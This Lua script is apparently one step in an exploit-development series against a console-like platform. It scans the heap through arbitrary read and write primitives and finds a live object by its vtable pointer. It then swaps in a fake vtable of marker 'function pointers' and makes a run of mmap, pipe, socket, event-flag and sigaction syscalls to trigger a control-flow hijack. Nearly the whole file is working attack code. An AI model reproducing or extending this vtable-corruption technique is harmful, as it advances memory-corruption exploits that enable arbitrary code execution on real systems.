-- CRASH_CLASS: RISKY (intentional vtable corruption)
-- PROBE 41o: vtable redirect via heap write primitive
-- From 41n: live heap objects have vtable ptr 0x1_0E324EE0 at +00
-- Plan:
--   1. Allocate GPU mmap anchor, scan backward for live objects
--   2. Find one with vtable = 0x1_0E324EE0
--   3. Allocate a second mmap page as our "fake vtable" region
--   4. Fill fake vtable with recognizable marker values
--   5. Overwrite object's +00 to point to our fake vtable
--   6. Try syscall triggers to force vtable dereference
--   7. After each trigger, check if fake vtable was READ (entries changed/zeroed)
--   8. Restore original vtable before exit
-- NOTE: this WILL likely crash the loader or the process

print("=== PROBE 41o: VTABLE REDIRECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, lo, hi)
    local ok1 = safe_wd(addr, lo)
    local ok2 = safe_wd(addr + 4, hi)
    return ok1 and ok2
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_pipe   = make_syscall(42)
local sc_close  = make_syscall(6)
local sc_socket = make_syscall(97)
local sc_evf_create = make_syscall(538)
local sc_evf_delete = make_syscall(539)
local sc_dynlib_get_list = make_syscall(592)
local sc_sigaction = make_syscall(416)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

--------------------------------------------------------------------
-- STEP 1: Allocate anchor + fake vtable page
--------------------------------------------------------------------
local anchor = do_mmap(PAGE)
if not anchor then print("anchor mmap FAILED"); return end
print("anchor: " .. hex(anchor))

-- Allocate a SECOND page for our fake vtable
local fake_vt_page = do_mmap(PAGE)
if not fake_vt_page then print("fake_vt mmap FAILED"); return end
print("fake_vt page: " .. hex(fake_vt_page))
print("")

--------------------------------------------------------------------
-- STEP 2: Find a live object with vtable 0x1_0E324EE0
-- The vtable value may differ per run, so match pattern:
-- +00 hi=1, lo in range 0x08000000-0x1FFFFFFF (data segment)
-- +08 is a small value (type tag)
-- At least one heap ptr in +10..+40
--------------------------------------------------------------------
print("--- STEP 2: FIND LIVE OBJECT ---")

local victim = nil
local victim_vtable_lo = nil
local victim_vtable_hi = nil

for i = 1, 384 do
    local pg = anchor - i * 0x1000
    if pg <= 0 then break end

    -- quick check: skip zero and freed pages
    local first_dw = safe_rd(pg)
    if first_dw == nil then break end
    if first_dw == 0 or first_dw == 0xAFAFAFAF then
        -- skip
    else
        -- scan at 0x40 alignment (object size from 41i)
        for off = 0, 0xF00, 0x40 do
            local a = pg + off
            local q0 = safe_rq(uint64(a))
            if q0 then
                local h0, l0 = get_hi_lo(q0)
                -- vtable pattern: hi=1, lo is a reasonable data-segment addr
                if h0 == 1 and l0 >= 0x08000000 and l0 < 0x20000000 then
                    -- verify: +08 should be a small value (tag/size)
                    local q1 = safe_rq(uint64(a + 8))
                    if q1 then
                        local h1, l1 = get_hi_lo(q1)
                        if h1 == 0 and l1 < 0x10000 then
                            -- looks like a vtable + tag structure
                            victim = a
                            victim_vtable_hi = h0
                            victim_vtable_lo = l0
                            break
                        end
                    end
                end
            end
        end
    end
    if victim then break end
end

if not victim then
    print("  no live object found with vtable pattern")
    -- try broader: any object where +00 is hi=1
    for i = 1, 256 do
        local pg = anchor - i * 0x1000
        if pg <= 0 then break end
        local first_dw = safe_rd(pg)
        if first_dw == nil then break end
        if first_dw ~= 0 and first_dw ~= 0xAFAFAFAF then
            for off = 0, 0xF00, 0x10 do
                local q0 = safe_rq(uint64(pg + off))
                if q0 then
                    local h0, l0 = get_hi_lo(q0)
                    if h0 == 1 and l0 > 0x01000000 then
                        victim = pg + off
                        victim_vtable_hi = h0
                        victim_vtable_lo = l0
                        break
                    end
                end
            end
        end
        if victim then break end
    end
end

if not victim then
    print("  STILL no victim found. Dumping sample pages...")
    for i = 1, 8 do
        local pg = anchor - i * 0x1000
        local d = safe_rd(pg)
        if d then
            local q = safe_rq(uint64(pg))
            print(string.format("  pg-%d (%s): dw=%s q=%s",
                i, hex(pg), hex(d), q and dump_qword(q) or "?"))
        end
    end
    pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
    pcall(function() sc_munmap(uint64(fake_vt_page), uint64(PAGE)) end)
    print("=== PROBE 41o COMPLETE (no victim) ===")
    return
end

print(string.format("  VICTIM at %s, vtable=%08X_%08X",
    hex(victim), victim_vtable_hi, victim_vtable_lo))

-- dump victim object
print("  victim dump:")
for off = 0, 0x78, 8 do
    local q = safe_rq(uint64(victim + off))
    if q then
        local h, l = get_hi_lo(q)
        local tag = ""
        if off == 0 then tag = " <-- VTABLE" end
        if h == 3 then tag = tag .. " HEAP" end
        if h == 1 then tag = tag .. " DATA" end
        if h ~= 0 or l ~= 0 then
            print(string.format("    +%02X: %s%s", off, dump_qword(q), tag))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 3: Build fake vtable in our controlled page
-- Fill it with marker values we can detect if read
-- Use addresses back into our own page for "function pointers"
-- so if the kernel calls one, it hits our data (crash with known PC)
--------------------------------------------------------------------
print("--- STEP 3: BUILD FAKE VTABLE ---")

-- write 32 qword entries (256 bytes) of recognizable markers
-- each entry = fake_vt_page + 0x1000 + (slot * 8) => points into our page
-- but we'll use distinctive values: 0xDEADxxxx pattern
for slot = 0, 31 do
    local off = slot * 8
    local marker_lo = 0xDEAD0000 + slot
    local marker_hi = 0x00000000  -- keep in 32-bit range for safety
    -- actually: use the anchor address as a "function pointer"
    -- if kernel tries to call it, it'll jump to our mmap page (NX crash)
    -- which gives us a PC = anchor value in the crash log
    if slot < 16 then
        -- point to different offsets in our page
        safe_wq(fake_vt_page + off, anchor + slot * 0x100, 0)
    else
        -- distinctive markers for higher slots
        safe_wq(fake_vt_page + off, marker_lo, marker_hi)
    end
end

-- verify
print("  fake vtable at " .. hex(fake_vt_page) .. ":")
for off = 0, 0x78, 8 do
    local q = safe_rq(fake_vt_page + off)
    if q then
        print(string.format("    [+%02X] %s", off, dump_qword(q)))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 4: Overwrite victim's vtable pointer
--------------------------------------------------------------------
print("--- STEP 4: REDIRECT VTABLE ---")

-- save original
local orig_lo = victim_vtable_lo
local orig_hi = victim_vtable_hi
print(string.format("  original vtable: %08X_%08X", orig_hi, orig_lo))
print(string.format("  new vtable:      %08X_%08X", 0, fake_vt_page))

-- write the new vtable pointer (our fake_vt_page address)
-- fake_vt_page is in 0x3_1xxxxxxx range (heap), so hi=3-ish
-- Actually fake_vt_page is from mmap, could be different range
local fvt_hi = 0
local fvt_lo = fake_vt_page
-- handle >32-bit addresses
if fake_vt_page > 0xFFFFFFFF then
    -- need to split
    fvt_hi = math.floor(fake_vt_page / 0x100000000)
    fvt_lo = fake_vt_page % 0x100000000
end

local w_ok = safe_wq(victim, fvt_lo, fvt_hi)
print("  write ok: " .. tostring(w_ok))

-- verify the overwrite
local check = safe_rq(uint64(victim))
if check then
    print("  victim +00 now: " .. dump_qword(check))
else
    print("  victim +00: FAULT (page gone!)")
    print("=== PROBE 41o COMPLETE (victim lost) ===")
    return
end
print("")

--------------------------------------------------------------------
-- STEP 5: Trigger syscalls that might dereference the object
-- After each, check if our fake vtable entries were read/modified
--------------------------------------------------------------------
print("--- STEP 5: TRIGGER ATTEMPTS ---")

local function check_vt_intact()
    -- read first 4 entries of fake vtable, see if they changed
    local changed = 0
    for slot = 0, 3 do
        local q = safe_rq(fake_vt_page + slot * 8)
        if q then
            local h, l = get_hi_lo(q)
            local expected = anchor + slot * 0x100
            if l ~= expected or h ~= 0 then
                changed = changed + 1
            end
        else
            changed = changed + 1  -- page gone = definitely touched
        end
    end
    return changed == 0
end

print("  baseline vt intact: " .. tostring(check_vt_intact()))

-- 5a: mmap/munmap churn
for i = 1, 8 do
    local a = do_mmap(PAGE)
    if a then pcall(function() sc_munmap(uint64(a), uint64(PAGE)) end) end
end
print("  after mmap churn: vt_intact=" .. tostring(check_vt_intact()))

-- 5b: pipe
local pb = memory.alloc(16)
for i = 1, 4 do
    pcall(function() sc_pipe(pb) end)
    local f0 = safe_rd(pb)
    local f1 = safe_rd(pb + 4)
    if f0 and f0 > 0 then pcall(function() sc_close(f0) end) end
    if f1 and f1 > 0 then pcall(function() sc_close(f1) end) end
end
print("  after pipe churn: vt_intact=" .. tostring(check_vt_intact()))

-- 5c: socket
for i = 1, 4 do
    local ok_s, fd = pcall(function() return sc_socket(2, 1, 0) end)
    if ok_s then
        local fdn = to_num(fd)
        if fdn > 0 then pcall(function() sc_close(fdn) end) end
    end
end
print("  after socket churn: vt_intact=" .. tostring(check_vt_intact()))

-- 5d: EVF create/delete
local nb = memory.alloc(32)
memory.write_byte(nb, 0x76) -- v
memory.write_byte(nb + 1, 0x74) -- t
memory.write_byte(nb + 2, 0)
for i = 1, 4 do
    local ok_e, re = pcall(function() return sc_evf_create(nb, 0x11, memory.alloc(8)) end)
    if ok_e then
        local eid = to_num(re)
        if eid > 0 and eid < 100000 then
            pcall(function() sc_evf_delete(eid) end)
        end
    end
end
print("  after EVF churn: vt_intact=" .. tostring(check_vt_intact()))

-- 5e: dynlib walk
local hb = memory.alloc(1024)
local nb2 = memory.alloc(8)
pcall(function() sc_dynlib_get_list(hb, 128, nb2) end)
print("  after dynlib walk: vt_intact=" .. tostring(check_vt_intact()))

-- 5f: sigaction walk
local sa_buf = memory.alloc(64)
for sig = 1, 8 do
    pcall(function() sc_sigaction(sig, uint64(0), sa_buf) end)
end
print("  after sigaction: vt_intact=" .. tostring(check_vt_intact()))

-- 5g: try mmap with different flags that might touch vm objects
pcall(function()
    sc_mmap(uint64(0), uint64(PAGE), uint64(0x03),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("  after extra mmap: vt_intact=" .. tostring(check_vt_intact()))

-- 5h: munmap our ANCHOR itself
pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
local anchor2 = do_mmap(PAGE)
print("  after anchor unmap/remap: vt_intact=" .. tostring(check_vt_intact()))

print("")

--------------------------------------------------------------------
-- STEP 6: Check victim state + restore
--------------------------------------------------------------------
print("--- STEP 6: FINAL STATE ---")
local final_q0 = safe_rq(uint64(victim))
if final_q0 then
    print("  victim +00: " .. dump_qword(final_q0))
    local fh, fl = get_hi_lo(final_q0)
    if fl == fvt_lo and fh == fvt_hi then
        print("  vtable still points to our fake (not triggered)")
    else
        print("  *** VTABLE WAS MODIFIED BY SYSTEM ***")
    end

    -- restore original vtable
    print("  restoring original vtable...")
    safe_wq(victim, orig_lo, orig_hi)
    local restored = safe_rq(uint64(victim))
    print("  restored: " .. (restored and dump_qword(restored) or "FAULT"))
else
    print("  victim FAULT — object was freed/moved")
end

-- dump fake vtable final state
print("  fake vtable final state:")
for off = 0, 0x38, 8 do
    local q = safe_rq(fake_vt_page + off)
    if q then
        print(string.format("    [+%02X] %s", off, dump_qword(q)))
    else
        print(string.format("    [+%02X] FAULT", off))
    end
end

print("")
if anchor2 then pcall(function() sc_munmap(uint64(anchor2), uint64(PAGE)) end) end
pcall(function() sc_munmap(uint64(fake_vt_page), uint64(PAGE)) end)
print("=== PROBE 41o COMPLETE ===")
